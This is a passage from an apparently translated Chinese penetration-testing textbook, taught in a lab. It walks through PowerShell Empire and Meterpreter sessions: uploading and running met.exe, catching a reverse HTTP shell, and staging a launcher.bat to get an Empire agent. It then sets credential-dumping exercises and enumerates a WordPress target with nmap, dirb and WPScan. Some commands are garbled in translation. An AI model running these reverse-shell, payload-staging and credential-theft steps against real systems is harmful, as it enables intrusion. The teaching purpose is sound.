
```
Empire: S2Y5XW1 > upload /home/kali/met.exe, 72 KB
[*] 已调度代理上传 met.exe, 72 KB
[*] 已调度 S2Y5XW1 执行 TASK_UPLOAD
[*] 代理 S2Y5XW1 被分配任务 ID 12
[*] 代理 S2Y5XW1 返回了结果。
[*] 10.11.0.22 返回了有效结果。
```

```
Empire: S2Y5XW1 > shell dir
[*] 已调度 S2Y5XW1 执行 TASK_SHELL
[*] 代理 S2Y5XW1 被分配任务 ID 3
[*] 代理 S2Y5XW1 返回了结果。
Directory: C:\Users\offsec.corp\Downloads>
```

| 模式 | 最后写入时间 | 长度 名称 |
|---|---|---|
| -a---- | 10/2/2019 11:24 AM | 73802 met.exe |

```
.命令执行完成。
[*] 10.11.0.22 返回了有效结果。
```

> 列表 849 - 使用 metpreter 执行器

在上传 exploit 后，我们通过 `dir shell` 找到它的位置并执行：

```
(Empire: S2Y5XW1) > shell C:\Users\offsec.corp\Downloads>met.exe
[*] 已调度 S2Y5XW1 执行 TASK_SHELL
[*] 代理 S2Y5XW1 被分配任务 ID 5
* 代理 S2Y5XW1 返回了结果。
命令已执行。
* 10.11.0.22 返回了结果
```

850 - 执行 meterpreter 可执行文件

执行文件运行后，我们将切换回 meterpreter 监听器并观察传入的 shell：

+ * 在 http://10.11.0.4:7777 上启动 HTTP 反向处理程序
* http://10.11.0.4:7777 正在处理来自 10.11.0.22 的请求；正在 x86 payload
* Meterpreter 会话已打开 (10.11.0.4:7777
meterpreter>

列表 851 - Meterpreter 回调

从现有的 meterpreter 会话反向连接代理也很简单。我们可以创建一个 .bat 格式的启动器并使用 meterpreter 上传执行它。我们将使用：

```
(Empire: listeners) > stager/windows/launcher_bat
(Empire: stager/windows/launcher_bat) > set http
(Empire: stager/windows/launcher_bat) > execute
* Stager 输出: /tmp/launcher.bat
```

列表 852 - 创建启动器

我们随后上传并执行：

```
meterpreter > upload /tmp/launcher.bat
* 已上传 /tmp/launcher.bat -> /tmp/launcher.bat
* 已上传 4.69 KIB (100.0%) : /tmp/launcher.bat -> launcher.bat
```

```
meterpreter > shell
进程 4644 已创建。
通道已创建。
C:\Users\offsec.com\Downloads>dir
驱动器没有标签。
卷号为 9E6A-47FB
目录 C:\Users\offsec.com\Downloads
09/19/2019 08:42 AM <DIR>
09/19/2019 08:42 AM <DIR>
09/19/2019 08:42 AM 文件(s)         4,802 launcher.bat
目录(s)              22,359,040 字节可用
```

```
C:\Users\offsec.com\Downloads>launcher.bat
```

列表 853 - 上传并执行启动器

现在我们应该从被攻破的主机接收一个代理：

```
(Empire: agents) > 10.11.0.22 现在活跃 (Slack)
```

列表 854 - 接收 回 回

使用这些技术，我们可以利用同一主机上的两个框架。

# 23.3.1 练习

1. 设置 PowerShell 监听器和 stager 并获取一个工作的代理。
2. 使用各种模块对域进行枚举。
3. 使用 Jeff_Admin 账户执行远程桌面登录，确保凭据缓存在 Windows 客户端上并使用 Empire 导出凭据。
4. 尝试不同的横向移动模块。

### 23.4 总结

在本模块中，我们涵盖了 PowerShell Empire 的语法和功能，例如监听器、stagers 和代理。我们还探索了用于枚举、获取凭据和横向移动的各种模块。最后，我们查看了 PowerShell Empire 和 Metasploit 如何一起使用。

# 24. 组合部分：渗透测试分解

现在我们已经介绍了渗透测试的所有部分，是时候将它们组合在一起了。在本模块中，我们将进行一个受真实世界发现启发的模拟渗透测试。

虽然我们在练习中的目标是获取环境管理员权限，但重要的是，这并不是渗透测试的最终目标。我们的目标应该由客户的数据基础设施和业务模型决定。例如，如果客户的业务是数据仓库，我们的目标就是获取这些数据。这是因为这种类型的泄露会对客户产生最显著的影响。在某些情况下，域管理员权限可以帮助我们实现该目标，但并非总是如此。

在渗透测试期间，我们将在枚举和利用之间来回。我们将在枚举阶段花费一些时间，以确保我们使用的利用方法是正确的。我们还将回顾一些容易犯的错误，并讨论为什么在目标上获取 root/admin 并不总是必要的。

我们的虚拟客户提供了一个名为 "sandbox.local" 的初始目标，并提到被攻破的域管理员帐户对他们的业务影响最大。sandbox 网络可以通过 VPN 访问，网络布局如图 317 所示。

![](img/f99f528ca9845f4c256ce54e882b1345_744_0.png)

图 317：目标网络概览

> 该域可以通过 PWK VPN 访问，但要求我们向 `/etc/hosts` 文件添加条目。首先，我们将通过将 `/etc/hosts` 复制到主目录下的 `hosts.org` 来备份现有文件。现在我们将添加一个条目，允许我们通过名称连接到该域，通过运行 `sudo bash -c "10.11.1.250 sandbox.local" >> /etc/hosts` 设置好后，我们可以继续。

# 24.1 公共网络枚举

我们将首先对 DNS 名称 `sandbox.local` 解析出的外部主机进行扫描。为此，我们将使用 `nmap`：

```
kali@kali:~$ sudo nmap -sC -sS -p0-65535 sandbox.local
```

列表 855 - 用于初始发现的 nmap 命令

列表 855 中的命令将使用 nmap 的默认脚本集 `-sC`、使用 SYN 扫描以加快速度 `-sS`、扫描所有端口 `-p0-65535`，并仅针对 `sandbox.local` 网络。

# 使用 Kali Linux 进行渗透测试 2.0

Nmap 扫描结果可以在列表 856 中找到。

```
Nmap scan for sandbox.local (10.11.1.250)
Host is up (0.00060s latency).
Not shown: 65534 filtered ports
PORT STATE METHOD
22/tcp open ssh
ssh-hostkey:
  2048:fe8:89:b3:79:2f:44:b2:61:18:a4:fb:d5:a1:f3:43 (RSA)
  256:fe8:84:f1:cd:f3:c8:90:3d:60:e8:b1:1d:99:27 (ECDSA)
  256:14:a6:ba7:ee0:57:e5:0c:cc:76:31:91:dd:9f (ED25519)
80/tcp open http
http-generator: WordPress 5.3
http-title: Sandbox – See the future, Feel the shine
MAC Address: 00:50:56:8A:C8:51 (VMware)
Nmap done: 1 IP address (1 host up) scanned in 11.66 seconds
```

> 列表 856 - 初始发现的 Nmap 扫描

让我们查看此扫描结果。首先，Nmap 仅显示了两个开放端口：22 和 80。Nmap 指纹识别出这些服务分别在相应端口上运行 SSH 服务和 HTTP 服务。Nmap 默认插件集显示了 ssh-hostkeys。

HTTP 服务告诉我们，运行的应用程序可能是 WordPress 5.3。SSH 服务暴露的风险通常远少于 HTTP 服务暴露的风险。因此，HTTP 服务似乎是渗透 `sandbox.local` 环境的更好的起点。

## 24.2 针对 Web 应用程序

第一步仅仅是访问 Web 应用程序页面。

![](img/f99f528ca9845f4c256ce54e882b1345_745_0.png)

![](img/f99f528ca9845f4c256ce54e882b1345_746_0.png)

![](img/f99f528ca9845f4c256ce54e882b1345_746_1.png)

图 318：访问 Sandbox.local Web 页面

首页看起来是一个公司非常标准的着陆页。导航栏中的链接都指向主页上的锚点，左下角有一个请求反馈的调查问卷。似乎没有其他可供用户控制的输入字段。

Nmap 扫描显示该网页运行在 WordPress 5.3 上，但要确认这一点，需要进一步的枚举。

虽然 WordPress 核心本身存在许多漏洞，但 WordPress 开发者会迅速修复这些漏洞。然而，主题和插件是由社区编写的，许多漏洞没有得到妥当修复，或者根本没有被修复。

这使得 WordPress 成为一个渗透的极佳目标。

### 24.2.1 Web 应用程序枚举

在我们开始专门针对 WordPress 进行渗透之前，让我们进行基础的暴力破解以发现任何潜在的敏感文件，并确认网站是否运行着 WordPress。为此，我们将如下所示使用 `dir`。

```
kali@kali:- dir http://sandbox.local
```

列表 857 - `sandbox.local` 的 dir 扫描

虽然 `dir` 有许多我们可以可以使用的标志和功能，但我们选择运行一个简单的测试。
我们命令的输出可以在列表 858 中找到。

```
---- Scanning URL: http://sandbox.local/ -----
+ http://sandbox.local/index.php (CODE:301|SIZE:0)
+ http://sandbox.local/server-status (CODE:403|SIZE:278)
== DIRECTORY: http://sandbox.local/wp-admin/
== DIRECTORY: http://sandbox.local/wp-content/
== DIRECTORY: http://sandbox.local/wp-includes/
+ http://sandbox.local/xmlrpc.php (CODE:405|SIZE:42)
---- Entering directory: http://sandbox.local/wp-admin/ -----
+ http://sandbox.local/wp-admin/admin.php (CODE:302|SIZE:0)
== DIRECTORY: http://sandbox.local/wp-admin/css/
== DIRECTORY: http://sandbox.local/wp-admin/images/
== DIRECTORY: http://sandbox.local/wp-admin/includes/
+ http://sandbox.local/wp-admin/index.php (CODE:302|SIZE:0)
== DIRECTORY: http://sandbox.local/wp-admin/js/
== DIRECTORY: http://sandbox.local/wp-admin/main/
== DIRECTORY: http://sandbox.local/wp-admin/network/
== DIRECTORY: http://sandbox.local/wp-admin/user/
---- Entering directory: http://sandbox.local/wp-content/ -----
+ http://sandbox.local/wp-content/index.php (CODE:200|SIZE:0)
== DIRECTORY: http://sandbox.local/wp-content/plugins/
== DIRECTORY: http://sandbox.local/wp-content/themes/
== DIRECTORY: http://sandbox.local/wp-content/upgrade/
== DIRECTORY: http://sandbox.local/wp-content/uploads/
---- Entering directory: http://sandbox.local/wp-includes/ -----
(!) WARNING: DIRECTORY IS LISTABLE. No need to scan.
(Use mode '-w' if you want to scan)
---- Entering directory: http://sandbox.local/wp-admin/css/ -----
(!) WARNING: DIRECTORY IS LISTABLE. No need to scan.
(Use mode '-w' if you want to scan)
END_TIME: Mon Dec 9 13:00:40 2019
DOWNLOADED: 32
```

列表 858 - dir 输出

我们的扫描发现了目标上常见的 WordPress 目录 `wp-admin`, `wp-content` 和 `wp-includes`。我们还发现了一些可列出的目录；但这些是常见目录。让我们使用 WPScan 进行更具体的扫描，通过已知漏洞数据库来发现 WordPress 实例的安全问题。为了进行彻底扫描，我们需要提供目标 URL `-url` 并配置枚举选项 `-enumerate` 为“所有插件” `ap`、“所有主题” `at`、“备份” `cb` 和“数据库导出” `db`。最终命令可以在列表 859 中找到。

```
kali@kali~$ wpscan sandbox.local --enumerate ap,at,cb,db
```

列表 859 - wscan 的命令

WPScan 输出了关于目标的有用信息：

```
...
[i] Plugin(s) Identified:
+] elementor
| Location: http://sandbox.local/wp-content/plugins/element/
| Last Updated: 2019-12-08 17:19:00Z
|!] The version is out of date, the latest version is 2.7.6
| Found By: Urls In Homepage (Passive Detection)
| Version: 2.7.4 (100% confidence)
| Found By: Query Parameter (Passive Detection)
| - http://sandbox.local/wp-content/plugins/element/assets/css/frontend.min.css?ver=2.7.4
| - http://sandbox.local/wp-content/plugins/element/assets/js/frontend.min.js?ver=2.7.4
| Confirmed By: Readme Tag (Aggressive Detection)
| - http://sandbox.local/wp-content/plugins/element/readme.txt
+] ocean-extra
| Location: http://sandbox.local/wp-content/plugins/ocean-extra/
| Last Updated: 2019-11-13 16:17:00Z
|!] The version is out of date, the latest version is 1.5.19
| Found By: Urls In Homepage (Passive Detection)
| Version: 1.5.16 (100% confidence)
| Found By: Readme Tag (Aggressive Detection)
| - http://sandbox.local/wp-content/plugins/ocean-extra/readme.txt
| Confirmed: Readme Changel Section (Aggressive Detection)
| - http://sandbox.local/wp-content/plugins/ocean-extra/readme.txt
+] wp-survey-and-poll
```
